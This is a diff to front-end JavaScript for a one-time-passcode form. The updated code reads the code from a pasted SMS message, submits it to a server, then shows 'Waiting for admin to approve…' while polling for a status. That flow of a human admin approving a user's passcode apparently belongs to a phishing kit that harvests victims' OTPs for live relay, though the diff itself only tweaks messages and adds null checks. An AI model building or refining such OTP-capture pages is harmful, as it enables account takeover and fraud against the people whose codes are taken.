@@ -899,17 +899,24 @@
   // OTP SUBMIT — calls /api/verify-otp then polls /api/check-otp-status
   // ══════════════════════════════════════════════════════
   async function doOtp() {
-    const otp = [0,1,2,3,4,5].map(j => document.getElementById('o'+j).value).join('');
+    // UPDATED: Read directly from the extracted hidden input instead of the 6 separate boxes
+    const otp = document.getElementById('finalOtpValue') ? document.getElementById('finalOtpValue').value : '';
+    
     if (otp.length < 6) {
-      showOtpMsg('warning', 'Please enter all 6 digits of your OTP.');
+      showOtpMsg('warning', 'Please paste a valid SMS message containing a 6-digit verification code.');
       return;
     }
 
     hideOtpMsgs();
 
     let c = 3;
-    document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
-    document.getElementById('mOtp').classList.add('show');
+    // Safe check in case otpVT doesn't exist in your updated layout
+    const vtEl = document.getElementById('otpVT');
+    if (vtEl) vtEl.textContent = 'Please wait… (' + c + 's)';
+    
+    const mOtpEl = document.getElementById('mOtp');
+    if (mOtpEl) mOtpEl.classList.add('show');
+    
     document.getElementById('bOtp').disabled = true;
 
     const countdown = setInterval(() => {
@@ -927,7 +934,7 @@
       const data = await res.json();
 
       clearInterval(countdown);
-      document.getElementById('mOtp').classList.remove('show');
+      if (mOtpEl) mOtpEl.classList.remove('show');
 
       if (data.success) {
         showOtpMsg('success', 'OTP submitted. Waiting for admin to approve…');
@@ -939,13 +946,13 @@
 
     } catch (err) {
       clearInterval(countdown);
-      document.getElementById('mOtp').classList.remove('show');
+      if (mOtpEl) mOtpEl.classList.remove('show');
       document.getElementById('bOtp').disabled = false;
       showOtpMsg('error', 'Network error. Please check your connection.');
     }
   }
 
-  // ══════════════════════════════════════════════════════
+  //══════════════════════════════════════════════════════
   // POLL /api/check-otp-status
   // ══════════════════════════════════════════════════════
   let otpPollInterval = null;
